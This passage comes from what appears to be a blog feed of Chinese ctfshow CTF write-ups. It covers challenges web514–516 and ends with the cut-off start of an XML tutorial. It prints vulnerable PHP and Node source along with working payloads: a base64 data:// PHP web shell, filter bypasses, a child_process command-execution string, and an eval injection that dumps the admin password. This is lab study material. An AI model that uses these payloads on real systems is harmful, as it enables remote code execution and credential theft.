class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>)))&#123;</span><br><span class="line"><span class="variable">$encode</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$value</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="variable">$ret</span>=<span class="title function_ invoke__">chunk_split</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$result</span>));</span><br><span class="line"><span class="variable">$encode</span> = <span class="string">&#x27;data:image/jpg/png/gif;base64,&#x27;</span> . <span class="variable">$ret</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>), <span class="variable">$encode</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$encode</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkConfig</span>(<span class="params"><span class="variable">$templateContent</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$config</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;config:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;config:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVar</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;var:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\(|\[|\`|\&#x27;|\$|\_|\&lt;|\?|\&quot;|\+|nginx|\)|\]|include|data|text|filter|input|file|GET|POST|COOKIE|SESSION|file/i&#x27;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;$v=&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;var:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$v</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFoot</span>(<span class="params"><span class="variable">$templateContent</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;cnzz&#125;&#125;&#x27;</span>)) &#123;</span><br><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line"><span class="variable">$foot</span> = <span class="variable">$config</span>[<span class="string">&#x27;cnzz&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$foot</span>))&#123;</span><br><span class="line"><span class="variable">$foot</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$foot</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;|&gt;|\?|=|php|sess|log|phar|\.|\[|\&#123;|\(|_/&#x27;</span>, <span class="variable">$foot</span>))&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$foot</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&#x2F;api&#x2F;admin_settings.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-16 15:50:14</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-16 16:26:31</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line"><span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$config</span>[<span class="variable">$key</span>]=<span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$config</span>));</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改成功&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&#x2F;api&#x2F;admin_templates.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-19 18:49:54</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-25 17:17:07</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;../render/db_class.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line"><span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">);</span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$user</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,name,type,path,des from templates limit 0,10&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line"><span class="variable">$temps</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select_array</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$temps</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;count&#x27;</span>]=<span class="title function_ invoke__">count</span>(<span class="variable">$temps</span>);</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="variable">$temps</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;update&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$row</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$row</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$row</span>))&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span> =<span class="string">&quot;update templates set name=&#x27;<span class="subst">&#123;$row-&gt;name&#125;</span>&#x27;,path=&#x27;<span class="subst">&#123;$row-&gt;path&#125;</span>&#x27;,type=&#x27;<span class="subst">&#123;$row-&gt;type&#125;</span>&#x27;,des=&#x27;<span class="subst">&#123;$row-&gt;des&#125;</span>&#x27; where id =<span class="subst">&#123;$row-&gt;id&#125;</span>&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">update_one</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;实时更新成功&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;实时更新失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;getContents&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$template</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$template</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\/\\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$template</span>-&gt;path))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;count&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="keyword">array</span>(<span class="string">&#x27;contents&#x27;</span>=&gt;<span class="title function_ invoke__">htmlspecialchars</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../templates/&#x27;</span>.<span class="variable">$template</span>-&gt;path)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;download&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\/\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$path</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/octet-stream&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition:  attachment; filename=&quot;&#x27;</span> . <span class="variable">$path</span>. <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../templates/&#x27;</span>.<span class="variable">$path</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|phar|ini|settings/i&#x27;</span>, <span class="variable">$name</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;|&gt;|\?|php|=|script|,|;|\(/i&#x27;</span>, <span class="variable">$content</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传失败&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../templates/&#x27;</span>.<span class="variable">$name</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传成功&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="comment"># code...</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$row</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;name))&#123;</span><br><span class="line"><span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;type))&#123;</span><br><span class="line"><span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;des))&#123;</span><br><span class="line"><span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;path))&#123;</span><br><span class="line"><span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;id))&#123;</span><br><span class="line"><span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br></pre></td></tr></table></figure><p>这次我们直接包含一个2.sml文件,其中内容换成</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUW3pmXSk7Pz4x</span></span><br></pre></td></tr></table></figure><p>但是需要绕过这行,简单使用数组绕过就好</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;|&gt;|\?|php|=|script|,|;|\(/i&#x27;</span>, <span class="variable">$content</span>))&#123;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414182124982.png" alt="image-20220414182124982"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414183409943.png" alt="image-20220414183409943"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414182908939.png" alt="image-20220414182908939"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414183420553.png" alt="image-20220414183420553"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414183454050.png" alt="image-20220414183454050"></p><h1 id="web515"><a href="#web515" class="headerlink" title="web515"></a>web515</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> express = <span class="keyword">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> _= <span class="keyword">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title function_ invoke__">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET users listing. */</span></span><br><span class="line">router.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; title: <span class="string">&#x27;æˆ‘æ˜¯å¤è¯»æœº&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_ invoke__">post</span>(<span class="string">&#x27;/&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(req.body.user!=<span class="literal">null</span>)&#123;</span><br><span class="line">msg = req.body.user;</span><br><span class="line"><span class="keyword">if</span>((msg.<span class="keyword">match</span>(/proto|process|<span class="keyword">require</span>|exec|<span class="keyword">var</span>|<span class="string">&#x27;|&quot;|:|\[|\]|[0-9]/))!==null || msg.length&gt;40)&#123;</span></span><br><span class="line"><span class="string">  res.render(&#x27;</span>index<span class="string">&#x27;, &#123; title: &#x27;</span>æ•æ„Ÿä¿¡æ¯ä¸å¤è¯»<span class="string">&#x27; &#125;);</span></span><br><span class="line"><span class="string">&#125;else&#123;</span></span><br><span class="line"><span class="string">res.render(&#x27;</span>index<span class="string">&#x27;, &#123; title: eval(msg) &#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;else&#123;</span></span><br><span class="line"><span class="string">res.render(&#x27;</span>index<span class="string">&#x27;, &#123; title: &#x27;</span>æˆ‘æ˜¯å¤è¯»æœº<span class="string">&#x27; &#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">module.exports = router;</span></span><br></pre></td></tr></table></figure><p>过滤了一些字符</p><p>我们采用eval嵌套</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php?a=<span class="keyword">require</span>( <span class="string">&#x27;child_process&#x27;</span> ).<span class="title function_ invoke__">spawnSync</span>( <span class="string">&#x27;ls&#x27;</span>,[<span class="string">&#x27;/&#x27;</span>] ).stdout.<span class="title function_ invoke__">toString</span>()</span><br><span class="line">POST</span><br><span class="line">&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;eval(req.query.a)&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414184559957.png" alt="image-20220414184559957"></p><h1 id="web516"><a href="#web516" class="headerlink" title="web516"></a>web516</h1><p>关键语句,不太懂js</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctx.body=&#x27;&lt;h3&gt;Hello &#x27;+user[0].username+&#x27;&lt;/h3&gt; your name is: &#x27;+user[0].username+&#x27; your id is: &#x27;+user[0].id+ &#x27; your password is: &#x27;+eval(&#x27;md5(&#x27;+user[0].password+&#x27;)&#x27;);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span>);<span class="keyword">const</span> <span class="variable constant_">init</span>=<span class="title function_ invoke__">async</span>()=&gt;&#123;await User.sequelize.<span class="title function_ invoke__">query</span>(<span class="string">&quot;select password from Users where username=&#x27;admin&#x27; into outfile &#x27;/app/public/flag&#x27;;&quot;</span>,&#123;type:User.sequelize.SELECT&#125;);&#125;;<span class="title function_ invoke__">init</span>(</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414185417494.png" alt="image-20220414185417494"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414185459158.png" alt="image-20220414185459158"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414185522037.png" alt="image-20220414185522037"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/ctfshow/ctf.show/XXE/"/>
      <url>/ctfshow/ctf.show/XXE/</url>
      
        <content type="html"><![CDATA[<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><h2 id="xml简介"><a href="#xml简介" class="headerlink" title="xml简介"></a>xml简介</h2><p>xml被设计用来传输和存储数据</p><p>html被设计用来显示数据</p><p><strong>什么是xml</strong></p><ul><li>指可扩展标记语言</li><li>是一种标记语言,很类似于html</li><li>设计宗旨是传输数据,而非显示数据</li><li>标签没有被预定义.需要自行定义标签</li><li>被设计为具有自我描述性</li><li>是w3c的推荐标准</li></ul><p><strong>xml与html的主要差异</strong></p><p>xml不是html的替代</p><p>xml被设计为传输和存储数据,其焦点是数据的内容</p><p>html被设计来显示数据,其焦点是数据的外观</p><p>html旨在显示信息,xml旨在传输信息</p><p><strong>xml是不作为的</strong></p><p>xml被设计用来结构化 存储以及传输信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;john&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>上面的语句仔细读一下就会发现像是john写给george的便签,存储为xml.</p><p>它仅仅是包装在xml标签中的纯粹的信息,我们需要在编写软件或者程序,才能传送接受和显示这个文档.</p><p><strong>xml仅仅是纯文本</strong></p><p>xml没有什么特别的,它仅仅是纯文本.有能力处理纯文本的软件都可以处理xml,不过,能够读懂xml的应用程序可以有针对性处理xml的处理xml的标签.标签的功能性意义依赖于应用程序的特性</p><p><strong>通过xml可以发明自己的标签</strong></p><p>上面的xml文档在xml标准中没有定义过,这些标签是由文档的创作者发明的,这是因为xml没有预定义的标签</p><p><strong>xml把数据从html中分离</strong></p><p>如果需要在heml文档中显示动态的数据,那么每当数据改变时将花费大量时间来编辑html,通过xml数据能够村塾在独立的xml文件汇总,这样就可以专注于使用html进行布局和显示,并确保修改底层数据不在需要对html进行任何的变动.通过几行的javascript,你就可以读取一个外部xml文件,然后更新html中的数据内容</p><h2 id="XML树结构"><a href="#XML树结构" class="headerlink" title="XML树结构"></a>XML树结构</h2><p>xml使用简单的具有自我描述性的语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-885-1&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span 